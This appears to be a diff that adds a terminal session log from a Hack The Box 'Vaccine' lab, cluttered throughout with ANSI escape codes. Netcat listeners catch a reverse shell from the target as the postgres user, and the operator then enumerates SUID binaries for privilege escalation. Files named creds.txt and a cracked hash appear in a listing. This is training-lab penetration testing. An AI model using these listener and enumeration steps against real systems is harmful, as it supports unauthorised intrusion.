@@ -1,0 +1,773 @@
+Script started on 2024-10-25 10:39:28-04:00 [TERM="tmux-256color" TTY="/dev/pts/2" COLUMNS="126" LINES="30"]
+                                                                                                                              [0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mt[24m[4mt[24m[38;2;153;153;153mmux [39m[4mt[39m[4ma[24m[39m [39m [39m [38;2;153;153;153mil nmap_result.txt[39m[18D[4mt[4ma[39m[4mi[24m[24m[36mt[24m[36ma[24m[36mi[36ml[39m[39m [39m[1ms[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mqlmap_result.txt[39m[16D[1ms[39m[1me[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[0ms[0mes[1ms[1me[0m [1ms[0m[0m [38;2;153;153;153mqlmap_result.txt[39m[16D[0m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[38;2;153;153;153mnmap_result.txt[39m[15D[39m[1ms[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mqlmap_result.txt[39m[16D[1ms[39m[1mh[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[1mh[1mell_session[0m[?1l>[?2004l[13D[0ms[0mh[0me[0ml[0ml[0m_[0ms[0me[0ms[0ms[0mi[0mo[0mn
+tail: cannot open 'shell_session' for reading: No such file or directory
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mtail[39m [1mshell_session[0m[13D[0ms[0mh[0me[0ml[0ml[0m_[0ms[0me[0ms[0ms[0mi[0mo[0mn
+Completing file
+[J[0mshell_session1.log  [Jshell_session.log [JMM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session[K[0m[39m1.log
+Completing file[K[K
+[J[7mshell_session1.log[0m  [Jshell_session.log [JMM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session1.log[K[0m[39m
+[1B[7mshell_session1.log[0m  [7mshell_session1.log[0m  MM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session1.log[K[0m[39m.log 
+[1B[20C[7mshell_session.log [0mshell_session1.log  MM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session.log[K[0m[39m
+[JM[26C[1m [0m[18D[1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[1m.[1ml[1mo[1mg[0m[1C[0m [18D[5C[39m[4mt[39m[4ma[39m[4mi[39m[4ml[4ms[0m[4mh[0m[4me[0m[4ml[0m[4ml[0m[4m_[0m[4ms[0m[4me[0m[4ms[0m[4ms[0m[4mi[0m[4mo[0m[4mn[0m[4m.[0m[4ml[0m[4mo[0m[4mg[24m[0m [18D[P[17C [18D[P[17C [18D[4mt[24m[P[17C [18D[24m[1ms[24m[1mh[24m[1me[24m[1ml[24m[1ml[24m[1m_[24m[1ms[24m[1me[24m[1ms[24m[1ms[24m[1mi[24m[1mo[24m[1mn[24m[1m.[24m[1ml[24m[1mo[24m[1mg[0m[24m [18D[0m[4mv[0m[4ms[0m[4mh[0m[4me[0m[4ml[0m[4ml[0m[4m_[0m[4ms[0m[4me[0m[4ms[0m[4ms[0m[4mi[0m[4mo[0m[4mn[0m[4m.[0m[4ml[0m[4mo[4mg[24m[17D[4mv[4mm[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[4mi[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[P[17C [18D[4mv[24m[P[17C [18D[4mv[4mi[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[4mo[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[P[17C [18D[4mm[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[24m[36mv[24m[36mi[24m[36mm[39m[24m [24m[1ms[24m[1mh[24m[1me[24m[1ml[24m[1ml[24m[1m_[24m[1ms[24m[1me[24m[1ms[24m[1ms[24m[1mi[24m[1mo[24m[1mn[24m[1m.[24m[1ml[24m[1mo[1mg[0m[17D[?1l>[?2004l
+[J[?1000h[?1049h[?1h=[?2004h[1;30r[27m[24m[23m[0m[H[J[?25l[30;1H"shell_session.log" 647L, 22393B[2;1H▽[6n[2;1H  [3;1HPzz\[0%m[6n[3;1H           [1;1H[>c[1;1HScript started on 2024-10-25 10:16:45-04:00 [TERM="tmux-256color" TTY="/dev/pts/2" COLUMNS="126" LINES="30"]
+                                                                                                                               [3;1H[38;5;81m^M^M^M^[[0m[0m[38;5;81m^[[0m[27m[38;5;81m^[[0m[24m[38;5;81m^[[0m[J[38;5;81m^[[0m[34m┌[3;35H─[3;36H─[3;37H([38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[31mroot㉿kali[38;5;81m^[[0m[0m[38;5;81m^[[0m[31m[38;5;81m^[[0m[34m)-[[38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[39m~/Desktop/HTB/Vaccine[38;5;81m^[[0m[00[4;1Hm[38;5;81m^[[0m[34m][38;5;81m^M[0m
+└[5;2H─[5;3H[38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[31m#[38;5;81m^[[0m[0m[38;5;81m^[[0m[31m[38;5;81m^[[0m[39m [38;5;81m^[[0m[K[38;5;81m^[[0m[?1h[38;5;81m^[[0m=[38;5;81m^[[0m[?2004h[38;5;81m^[[0m[36mexit[38;5;81m^[[0m[39m[38;5;81m^H^H^H^H^[[0m[36ml[38;5;81m^[[0m[36ms[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^H^H^[[0m[??[6;1H1l[38;5;81m^[[0m>[38;5;81m^[[0m[?2004l[38;5;81m^M^M
+^[[0m[0m[38;5;81m^[[0m[01;34mbackup[38;5;81m^[[0m[0m[7C[38;5;81m^[[0m[01;31mbackup.zip[38;5;81m^[[0m[0m  jhon_backup_.pot  nmap.txt[12Cshell_session.log[38;5;81m^M[0m
+backup.hash  creds.txt   linpeas.out[7Csearch_request.txt  [38;5;81m^[[0m[01;34msqlmap_result[38;5;81m^[[0m[0m[38;5;81m^M
+
+^M^M^M
+^M^[[0m[0m[38;5;81m^[[0m[27m[38;5;81m^[[0m[24m[38;5;81m^[[0m[J[38;5;81m^[[0m[34m┌[11;31H─[11;32H─[11;33H([38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[31mroot㉿kali[38;5;81m^[[0m[0m[38;5;81m^[[0m[31m[38;5;81m^[[0m[34m)-[[38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[39m~/Desktop/HTB/Vaccine[38;5;81m^[[0m[0m[38;5;81m^[[0m[[[12;1H34m][38;5;81m^M[0m
+└[13;2H─[13;3H[38;5;81m^[[0m[1m[38;5;81m^[[0m[34m[38;5;81m^[[0m[31m#[38;5;81m^[[0m[0m[38;5;81m^[[0m[31m[38;5;81m^[[0m[39m [38;5;81m^[[0m[K[38;5;81m^[[0m[?1h[38;5;81m^[[0m=[38;5;81m^[[0m[?2004h[38;5;81m^[[0m[36mls[38;5;81m^[[0m[39m[38;5;81m^H^H^[[0m[36me[38;5;81m^[[0m[36mx[38;5;81m^[[0m[36mit[38;5;81m^[[0m[39m[38;5;81m^H^H^H^H^[[0m[36ml[38;5;81m^[[0m[366[14;1Hms[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^H^H^H^H^[[0m[36me[38;5;81m^[[0m[36mx[38;5;81m^[[0m[36mit[38;5;81m^[[0m[39m[38;5;81m^H^H^H^H^[[0m[36mi[38;5;81m^[[0m[36mp[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39ma[38;5;81m^H^H^H^H^[[0m[36me[38;5;81m^[[0m[36mx[38;5;81m^[[0m[33[15;1H6mi[38;5;81m^[[0m[36mt[38;5;81m^[[0m[39m[38;5;81m^H^H^H^H^[[0m[36ml[38;5;81m^[[0m[36ms[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^H^H^H^H^[[0m[36me[38;5;81m^[[0m[36mx[38;5;81m^[[0m[36mit[38;5;81m^[[0m[39m[38;5;81m^H^H^H^H^[[0m[36ml[38;5;81m^[[0m[36ms[38;5;81m^[[0m[39m[38;5;81m^[[0m[33[16;1H9m [38;5;81m^[[0m[39m [38;5;81m^H^H^H^H^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^H^H^[[0m[1mn[38;5;81m^[[0m[0m[38;5;81m^H^[[0m[1mn[38;5;81m^[[0m[0m[38;5;81m^[[0m[38;2;153;153;153mc -lvnp 9002 | tee linpeas.out #Host[38;5;81m^[[0m[39m[38;5;81m^[[0m[33[17;1H6D[38;5;81m^H^[[0m[0m[38;5;81m^[[0m[36mn[38;5;81m^[[0m[36mc[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[32m-[38;5;81m^[[0m[39m[38;5;81m^H^[[0m[32m-[38;5;81m^[[0m[32mn[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39mm[18;1H [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39mm[19;1H [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[32D[38;5;81m^[[0m[38;2;153;153;153mlvp  4444[38;5;81m^[[0m[39m[38;5;81m^[[0m[9D[38;5;81m^H^[[0m[32mn[38;5;81m^[[0m[32ml[38;5;81m^[[0m[39m[38;5;81m^H^[[0m[32ml[38;5;81m^[[0m[32mm[20;1Hv[38;5;81m^[[0m[32mp[38;5;81m^[[0m[39m[38;5;81m^[[0m[39m [38;5;81m^[[0m[39m [38;5;81m^[[0m[39m4[38;5;81m^[[0m[39m4[38;5;81m^[[0m[39m4[38;5;81m^[[0m[39m4[38;5;81m^[[0m[?1l[38;5;81m^[[0m>[38;5;81m^[[0m[?2004l[38;5;81m^M^M[0m
+listening on [any] 4444 ...[38;5;81m^M[0m
+connect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 37892[38;5;81m^M[0m
+bash: cannot set terminal process group (45185): Inappropriate ioctl for device[38;5;81m^M[0m
+bash: no job control in this shell[38;5;81m^M[0m
+postgres@vaccine:/var/lib/postgresql/11/main$ finc[38;5;81m^H[0m [38;5;81m^H^H[0m [38;5;81m^H^H[0m [38;5;81m^H^H[0m [38;5;81m^H[0mfind / -perm -4000 2>/dev/null #Find all SUID binaries[38;5;81m^M[26;1H^M[0m<d / -perm -4000 2>/dev/null #Find all SUID binaries[38;5;81m^M[0m
+/usr/lib/policykit-1/polkit-agent-helper-1[38;5;81m^M[0m
+/usr/lib/eject/dmcrypt-get-device[38;5;81m^M[0m
+/usr/lib/snapd/snap-confine[38;5;81m^M[0m[30;109H1,1[11CTop[1;1H[34h[?25h[?25l[30;99H:[1;1H[30;1H[K[30;1H:[?1000l[34h[?25hq[?1000h[?25l[?1000l[?2004l[30;1H[K[30;1H[?2004l[?1l>[?1049l[34h[?25h                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mvim[39m [1mshell_session.log[0m[21D[36mt[36ma[36mi[36ml[39m[0m [1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[0m[0m [0m [0m [?1l>[?2004l[13D[0ms[0mh[0me[0ml[0ml[0m_[0ms[0me[0ms[0ms[0mi[0mo[0mn
+tail: cannot open 'shell_session' for reading: No such file or directory
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mtail[39m [1mshell_session[0m[13D[0ms[0mh[0me[0ml[0ml[0m_[0ms[0me[0ms[0ms[0mi[0mo[0mn
+Completing file
+[J[0mshell_session1.log  [Jshell_session.log [JMM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session[K[0m[39m1.log
+Completing file[K[K
+[J[7mshell_session1.log[0m  [Jshell_session.log [JMM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session1.log[K[0m[39m
+[1B[7mshell_session1.log[0m  [7mshell_session1.log[0m  MM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session1.log[K[0m[39m.log 
+[1B[20C[7mshell_session.log [0mshell_session1.log  MM[0m[27m[24m[0m[39m[4C[36mtail[39m shell_session.log[K[0m[39m
+[JM[26C[1m [0m[18D[1ms[1mh[1me[1ml[1ml[1m_[1ms[1me[1ms[1ms[1mi[1mo[1mn[1m.[1ml[1mo[1mg[0m[1C[0m [?1l>[?2004l
+[J</html>
+postgres@vaccine:/var/www/html$ ^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B                                                ^C
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[4me[24m[38;2;153;153;153mxit[39m[24m[36me[36mx[39m[39m[4me[39m[4mx[39m[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2024-10-25 10:39:22-04:00 [COMMAND_EXIT_CODE="130"]
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mtail[39m [1mshell_session.log[0m[17D[5C[39m[4mt[39m[4ma[39m[4mi[39m[4ml[4ms[0m[4mh[0m[4me[0m[4ml[0m[4ml[0m[4m_[0m[4ms[0m[4me[0m[4ms[0m[4ms[0m[4mi[0m[4mo[0m[4mn[0m[4m.[0m[4ml[0m[4mo[0m[4mg[24m[0m [18D[P[17C [18D[P[17C [18D[4mt[24m[P[17C [18D[24m[1ms[24m[1mh[24m[1me[24m[1ml[24m[1ml[24m[1m_[24m[1ms[24m[1me[24m[1ms[24m[1ms[24m[1mi[24m[1mo[24m[1mn[24m[1m.[24m[1ml[24m[1mo[24m[1mg[0m[24m [18D[0m[4mc[0m[4ms[0m[4mh[0m[4me[0m[4ml[0m[4ml[0m[4m_[0m[4ms[0m[4me[0m[4ms[0m[4ms[0m[4mi[0m[4mo[0m[4mn[0m[4m.[0m[4ml[0m[4mo[4mg[24m[17D[4mc[4ma[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[4mt[4ms[4mh[4me[4ml[4ml[4m_[4ms[4me[4ms[4ms[4mi[4mo[4mn[4m.[4ml[4mo[4mg[24m[17D[24m[36mc[24m[36ma[24m[36mt[39m[24m [24m[1ms[24m[1mh[24m[1me[24m[1ml[24m[1ml[24m[1m_[24m[1ms[24m[1me[24m[1ms[24m[1ms[24m[1mi[24m[1mo[24m[1mn[24m[1m.[24m[1ml[24m[1mo[1mg[0m[17D[17C[1m[34m|[0m[39m [36ml[39m[39m[4ml[4me[24m[4me[4ms[24m[24m[36ml[24m[36me[24m[36ms[36ms[39m [?1l>[?2004l
+[?1049h[?1h=Script started on 2024-10-25 10:16:45-04:00 [TERM="tmux-256color" TTY="/dev/pts/2" COLUMNS="126" LINES="30"]
+                                                                                                                               [01;33m^MESC[0m[0m[01;33mESC[0m[27m[01;33mESC[0m[24m[01;33mESC[0m[J[01;33mESC[0m[34m┌──([01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[31mroot㉿kali[01;33mESC[0m[0m[01;33mESC[0m[31m[01;33mESC[0m[34m)-[[01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[39m~/Desktop/HTB/V accine[01;33mESC[0m[0m[01;33mESC[0m[34m]
+└─[01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[31m#[01;33mESC[0m[0m[01;33mESC[0m[31m[01;33mESC[0m[39m [01;33mESC[0m[K[01;33mESC[0m[?1h[01;33mESC[0m=[01;33mESC[0m[?2004h[01;33mESC[0m[36mexit[01;33mESCESC[0m[36ml[01;33mESC[0m[36ms[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[39[01;33mESC[0m[? 1l[01;33mESC[0m>[01;33mESC[0m[?2004l
+[01;33mESC[0m[0m[01;33mESC[0m[01;34mbackup[01;33mESC[0m[0m       [01;33mESC[0m[01;31mbackup.zip[01;33mESC[0m[0m  jhon_backup_.pot  nmap.txt            shell_session.log
+backup.hash  creds.txt   linpeas.out       search_request.txt  [01;33mESC[0m[01;34msqlmap_result[01;33mESC[0m[0m
+                                                                                                                              
+[01;33m^MESC[0m[0m[01;33mESC[0m[27m[01;33mESC[0m[24m[01;33mESC[0m[J[01;33mESC[0m[34m┌──([01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[31mroot㉿kali[01;33mESC[0m[0m[01;33mESC[0m[31m[01;33mESC[0m[34m)-[[01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[39m~/Desktop/HTB/V accine[01;33mESC[0m[0m[01;33mESC[0m[34m]
+└─[01;33mESC[0m[1m[01;33mESC[0m[34m[01;33mESC[0m[31m#[01;33mESC[0m[0m[01;33mESC[0m[31m[01;33mESC[0m[39m [01;33mESC[0m[K[01;33mESC[0m[?1h[01;33mESC[0m=[01;33mESC[0m[?2004h[01;33mESC[0m[36mls[01;33mESC[0m[3[01;33mESC[0m[36me[01;33mESC[0m[36mx[01;33mESC[0m[36mit[01;33mESCESC[0m[36ml[01;33mESC[0m[36 ms[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[[01;33mESC[0m[36me[01;33mESC[0m[36mx[01;33mESC[0m[36mit[01;33mESCESC[0m[36mi[01;33mESC[0m[36mp[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[[01;33mESC[0m[36me[01;33mESC[0m[36mx[01;33mESC[0m[36mi[01;33mESC[0m[36mt[01;33mESCESC[0m[36m l[01;33mESC[0m[36ms[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[[01;33mESC[0m[36me[01;33mESC[0m[36mx[01;33mESC[0m[36mit[01;33mESCESC[0m[36ml[01;33mESC[0m[36ms[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[[01;33mESC[0m[39m [01;33mESC[0m[39[01;33mESC[0m[1mn[01;33mESC[0m[0[01;33mESC[0m[1mn[01;33mES[0m [01;33mESC[0m[0m[01;33mESC[0m[38;2;153;153;153mc -lvnp 9002 | tee linpeas.out #Host[01;33mESC[0m[39m[01;33mESC[0m[36[01;33mESC[0m[0m[01;33mESC[0m[36mn[01;33mESC[0m[36mc[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[32m-[01;33mESC[0m[3 9[01;33mESC[0m[32m-[01;33mESC[0m[32mn[01;33mESC[0m[39m[01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39 m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[ 39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[32D[01;33mESC[0m[38;2;153;153;153mlvp  4444[01;33mESC[0m[39m[01;33mESC[0m[9[01;33mESC[0m[32mn[01;33mESC[0m[32ml[01;33mESC[0m[39[01;33mESC[0m[32ml[01;33mESC[0m[32mv[01;33mESC[0m[32mp[01;33mESC[0m [39m[01;33mESC[0m[39m [01;33mESC[0m[39m [01;33mESC[0m[39m4[01;33mESC[0m[39m4[01;33mESC[0m[39m4[01;33mESC[0m[39m4[01;33mESC[0m[?1l[01;33mESC[0m>[01;33mESC[0m[?2004l
+listening on [any] 4444 ...
+connect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 37892
+bash: cannot set terminal process group (45185): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ find / -perm -4000 2>/dev/null #Find all SUID binaries
+[01;33m^M[0m<d / -perm -4000 2>/dev/null #Find all SUID binaries
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+:[K[K[?1l>[?1049l                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?1l>[?2004l
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1mc[0m[1mc[0m[38;2;153;153;153mat shell_session.log| less [39m[27D[0m[4mc[39m[4ma[24m[24m[36mc[24m[36ma[36mt[39m[39m [39mr[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[38;2;153;153;153mesults.txt[39m[10D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153mshell_session.log| less [39m[24D[39m[1ms[0m[1ms[39m[1mh[0m[1mh[39m[1me[0m[1me[39m[1ml[39m[1ml[39m[1m_[39m[1ms[39m[1me[39m[1ms[39m[1ms[39m[1mi[39m[1mo[39m[1mn[39m[1m.[39m[1ml[39m[1mo[39m[1mg[0m[1m[34m|[0m[39m[39m [36ml[36me[36ms[36ms[39m[39m [38;2;153;153;153m [39m[39m[4ml[39m[4me[39m[4ms[24m[39m [39m [38;2;153;153;153ms [39m[4me[24m[24m [39m [39m [38;2;153;153;153mss [39m[24m[36ml[39m[24m [39m [39m [39m [38;2;153;153;153mess [39m[39m [39m [39m [39m [39m [38;2;153;153;153mless [39m[39m [39m [39m [39m [39m [38;2;153;153;153m less [39m[0m[39m [39m [39m [39m [39m [39m [39m [38;2;153;153;153m| less [39m[39m [39m [39m [39m [39m [39m [39m [?1l>[?2004l
+Script started on 2024-10-25 10:16:45-04:00 [TERM="tmux-256color" TTY="/dev/pts/2" COLUMNS="126" LINES="30"]
+                                                                                                                              [0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mexit[39m[36ml[36ms[39m[39m [39m [?1l>[?2004l
+[0m[01;34mbackup[0m       [01;31mbackup.zip[0m  jhon_backup_.pot  nmap.txt            shell_session.log
+backup.hash  creds.txt   linpeas.out       search_request.txt  [01;34msqlmap_result[0m
+                                                                                                                              
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Vaccine[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[36mls[39m[36me[36mx[36mit[39m[36ml[36ms[39m[39m [39m [36me[36mx[36mit[39m[36mi[36mp[39m[39m [39ma[36me[36mx[36mi[36mt[39m[36ml[36ms[39m[39m [39m [36me[36mx[36mit[39m[36ml[36ms[39m[39m [39m [39m [39m [1mn[0m[1mn[0m[38;2;153;153;153mc -lvnp 9002 | tee linpeas.out #Host[39m[36D[0m[36mn[36mc[39m[39m [32m-[39m[32m-[32mn[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [32D[38;2;153;153;153mlvp  4444[39m[9D[32mn[32ml[39m[32ml[32mv[32mp[39m[39m [39m [39m4[39m4[39m4[39m4[?1l>[?2004l
+listening on [any] 4444 ...
+connect to [10.10.15.90] from (UNKNOWN) [10.129.11.144] 37892
+bash: cannot set terminal process group (45185): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ finc    find / -perm -4000 2>/dev/null #Find all SUID binaries
+<d / -perm -4000 2>/dev/null #Find all SUID binaries
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/sudo
+/snap/core20/1169/usr/bin/chfn
+/snap/core20/1169/usr/bin/chsh
+/snap/core20/1169/usr/bin/gpasswd
+/snap/core20/1169/usr/bin/mount
+/snap/core20/1169/usr/bin/newgrp
+/snap/core20/1169/usr/bin/passwd
+/snap/core20/1169/usr/bin/su
+/snap/core20/1169/usr/bin/sudo
+/snap/core20/1169/usr/bin/umount
+/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1169/usr/lib/openssh/ssh-keysign
+/snap/core20/1081/usr/bin/chfn
+/snap/core20/1081/usr/bin/chsh
+/snap/core20/1081/usr/bin/gpasswd
+/snap/core20/1081/usr/bin/mount
+/snap/core20/1081/usr/bin/newgrp
+/snap/core20/1081/usr/bin/passwd
+/snap/core20/1081/usr/bin/su
+/snap/core20/1081/usr/bin/sudo
+/snap/core20/1081/usr/bin/umount
+/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1081/usr/lib/openssh/ssh-keysign
+/snap/core/11743/bin/mount
+/snap/core/11743/bin/ping
+/snap/core/11743/bin/ping6
+/snap/core/11743/bin/su
+/snap/core/11743/bin/umount
+/snap/core/11743/usr/bin/chfn
+/snap/core/11743/usr/bin/chsh
+/snap/core/11743/usr/bin/gpasswd
+/snap/core/11743/usr/bin/newgrp
+/snap/core/11743/usr/bin/passwd
+/snap/core/11743/usr/bin/sudo
+/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11743/usr/lib/openssh/ssh-keysign
+/snap/core/11743/usr/lib/snapd/snap-confine
+/snap/core/11743/usr/sbin/pppd
+/snap/core/11316/bin/mount
+/snap/core/11316/bin/ping
+/snap/core/11316/bin/ping6
+/snap/core/11316/bin/su
+/snap/core/11316/bin/umount
+/snap/core/11316/usr/bin/chfn
+/snap/core/11316/usr/bin/chsh
+/snap/core/11316/usr/bin/gpasswd
+/snap/core/11316/usr/bin/newgrp
+/snap/core/11316/usr/bin/passwd
+/snap/core/11316/usr/bin/sudo
+/snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11316/usr/lib/openssh/ssh-keysign
